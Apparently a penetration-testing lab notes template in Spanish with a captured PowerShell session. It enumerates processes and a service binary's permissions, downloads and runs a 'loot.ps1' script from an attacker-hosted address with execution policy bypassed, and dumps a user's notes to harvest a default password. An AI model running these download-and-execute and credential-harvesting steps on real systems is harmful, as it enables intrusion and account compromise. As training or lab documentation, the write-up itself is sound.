# {CATEGORÍA}: 

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}
## Objetivo
{OBJETIVO}
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion
```bash
PS C:\Users\diana> Get-Process | Select Name, Id                                                                                                                                                                  
Get-Process | Select Name, Id                                                                                                                                                                                     
                                                                                                                                                                                                                  
Name                    Id                                                                                                                                                                                        
----                    --                                                                                                                                                                                        
AggregatorHost        3528
cmd                   1248
conhost               5744
conhost               6476
csrss                  460
csrss                  568
dllhost               3616
dllhost               3772
dwm                    392
EnterpriseService     2940
fontdrvhost            828
fontdrvhost            832
Idle                     0
LogonUI               4296
lsass                  700
Memory Compression    2112
MicrosoftEdgeUpdate   5616
MpDefenderCoreService 2836
msdtc                 3856
MsMpEng               3036
nc                    1284
powershell            1712
powershell            2968
powershell            4660
Registry               100
SearchIndexer         5636
SearchProtocolHost    5580
SecurityHealthService 6676
services               668
SgrmBroker            4628
smss                   368
svchost                696
svchost                808
svchost                924
svchost                940
svchost               1000
svchost               1004
svchost               1044
svchost               1076
svchost               1124
svchost               1160
svchost               1216
svchost               1252
svchost               1288
svchost               1368
svchost               1540
svchost               1552
svchost               1564
svchost               1588
svchost               1616
svchost               1640
svchost               1680
svchost               1792
svchost               1808
svchost               1864
svchost               1896
svchost               1940
svchost               1968
svchost               2004
svchost               2044
svchost               2184
svchost               2284
svchost               2300
svchost               2400
svchost               2412
svchost               2460
svchost               2464
svchost               2472
svchost               2508
svchost               2540
svchost               2584
svchost               2684
svchost               2716
svchost               2728
svchost               2740
svchost               2772
svchost               2792
svchost               2816
svchost               2880
svchost               2892
svchost               2952
svchost               4376
svchost               4640
svchost               4916
svchost               5132
svchost               5212
svchost               5232
svchost               5388
svchost               5680
svchost               5980
svchost               6092
svchost               6216
System                   4
VGAuthService         2972
vm3dservice           2980
vm3dservice           3236
vm3dservice           4364
vmtoolsd              2996
wininit                552
winlogon               648
WmiPrvSE              3868


PS C:\Users\diana> Get-Process -Id 2940 | Format-List *
Get-Process -Id 2940 | Format-List *                                                                                                                                                                              
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Name                       : EnterpriseService                                                                                                                                                                    
Id                         : 2940
PriorityClass              : 
FileVersion                : 
HandleCount                : 58
WorkingSet                 : 3584000
PagedMemorySize            : 753664
PrivateMemorySize          : 753664
VirtualMemorySize          : -1
TotalProcessorTime         : 
SI                         : 0
Handles                    : 58
VM                         : 4294967295
WS                         : 3584000
PM                         : 753664
NPM                        : 5360
Path                       : 
Company                    : 
CPU                        : 
ProductVersion             : 
Description                : 
Product                    : 
__NounName                 : Process
BasePriority               : 8
ExitCode                   : 
HasExited                  : 
ExitTime                   : 
Handle                     : 
SafeHandle                 : 
MachineName                : .
MainWindowHandle           : 0
MainWindowTitle            : 
MainModule                 : 
MaxWorkingSet              : 
MinWorkingSet              : 
Modules                    : 
NonpagedSystemMemorySize   : 5360
NonpagedSystemMemorySize64 : 5360
PagedMemorySize64          : 753664
PagedSystemMemorySize      : 31952
PagedSystemMemorySize64    : 31952
PeakPagedMemorySize        : 843776
PeakPagedMemorySize64      : 843776
PeakWorkingSet             : 3706880
PeakWorkingSet64           : 3706880
PeakVirtualMemorySize      : -1
PeakVirtualMemorySize64    : 4294967295
PriorityBoostEnabled       : 
PrivateMemorySize64        : 753664
PrivilegedProcessorTime    : 
ProcessName                : EnterpriseService
ProcessorAffinity          : 
Responding                 : True
SessionId                  : 0
StartInfo                  : System.Diagnostics.ProcessStartInfo
StartTime                  : 
SynchronizingObject        : 
Threads                    : {2944, 3060}
UserProcessorTime          : 
VirtualMemorySize64        : 4294967295
EnableRaisingEvents        : False
StandardInput              : 
StandardOutput             : 
StandardError              : 
WorkingSet64               : 3584000
Site                       : 
Container                  : 

PS C:\Users\diana>
PS C:\Users\diana> $acl = Get-Acl "C:\Services\EnterpriseService.exe"     
$acl = Get-Acl "C:\Services\EnterpriseService.exe"
PS C:\Users\diana> $acl.Access | Format-Table IdentityReference, FileSystemRights, AccessControlType
$acl.Access | Format-Table IdentityReference, FileSystemRights, AccessControlType

IdentityReference                 FileSystemRights AccessControlType
-----------------                 ---------------- -----------------
NT AUTHORITY\SYSTEM                    FullControl             Allow
BUILTIN\Administrators                 FullControl             Allow
BUILTIN\Users          ReadAndExecute, Synchronize             Allow


PS C:\Users\diana>  
```
#### Paso 2: Leer archivos en documents:
```bash
PS C:\Users\diana\Documents> iwr -uri http://192.168.45.213:8000/loot.ps1 -Outfile loot.ps1
iwr -uri http://192.168.45.213:8000/loot.ps1 -Outfile loot.ps1
PS C:\Users\diana\Documents> powershell -ep bypass -f .\loot.ps1
powershell -ep bypass -f .\loot.ps1

=============================
Archivo: C:\Users\diana\Documents\note1.txt
=============================
Passwordless????? Zero trust????????

=============================
Archivo: C:\Users\diana\Documents\note10.txt
=============================
Fearless transparent nothing to hide. Check

=============================
Archivo: C:\Users\diana\Documents\note11.txt
=============================
microchip shortage - call DevOps/IT?

=============================
Archivo: C:\Users\diana\Documents\note12.txt
=============================
Get rental confirmation receipt from Handy

=============================
Archivo: C:\Users\diana\Documents\note13.txt
=============================
Where are provisioning scripts stored? Passwords should be hashed on them???

=============================
Archivo: C:\Users\diana\Documents\note14.txt
=============================
MS.17 010? MS 08-067? Phase out XP OT boxes within the year.

=============================
Archivo: C:\Users\diana\Documents\note15.txt
=============================
Board wants us to change all passwords every 10 days for security? Roll out by end of Q2

=============================
Archivo: C:\Users\diana\Documents\note16.txt
=============================
TODO: remove certutil.exe - being used by APTs (NGOs??)

=============================
Archivo: C:\Users\diana\Documents\note17.txt
=============================
15.20 for lunch, my split, burgr from intern jim - maybe payroll/hr ask them

=============================
Archivo: C:\Users\diana\Documents\note18.txt
=============================
who's responsible for Jenkins? ask Alex after holiday

=============================
Archivo: C:\Users\diana\Documents\note19.txt
=============================
IN PROGRESS: move all internal backup services to not run as SYSTEM

=============================
Archivo: C:\Users\diana\Documents\note2.txt
=============================
Default password for new resets will be WelcomeToWinter0121

=============================
Archivo: C:\Users\diana\Documents\note20.txt
=============================
Alex's password expired, but he's on holiday for the next 4 weeks. Password reset by IT to the default

=============================
Archivo: C:\Users\diana\Documents\note21.txt
=============================
PTO being phased out - HR being replaced with SaaS?

=============================
Archivo: C:\Users\diana\Documents\note22.txt
=============================

=============================
Archivo: C:\Users\diana\Documents\note3.txt
=============================
new directive: Security team is being outsourced end of Q3. Look on freelancer?

=============================
Archivo: C:\Users\diana\Documents\note4.txt
=============================
"In the midst of chaos, there is also opportunity." - Sun Tzu. look this up

=============================
Archivo: C:\Users\diana\Documents\note5.txt
=============================
remember to bring PDFs to the board meeting

=============================
Archivo: C:\Users\diana\Documents\note6.txt
=============================
security are mentioning domain administrator (??) compromise - look into it next week

=============================
Archivo: C:\Users\diana\Documents\note7.txt
=============================
Apparently they have SSH for Windows now? Remove netcat hack when ssh is working

=============================
Archivo: C:\Users\diana\Documents\note8.txt
=============================
Fall (autumn?), Winter, end of the year - Accounts???

=============================
Archivo: C:\Users\diana\Documents\note9.txt
=============================
Point by point refutation statements
PS C:\Users\diana\Documents>
```
> Note2 : WelcomeToWinter0121 
## Troubleshooting
## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

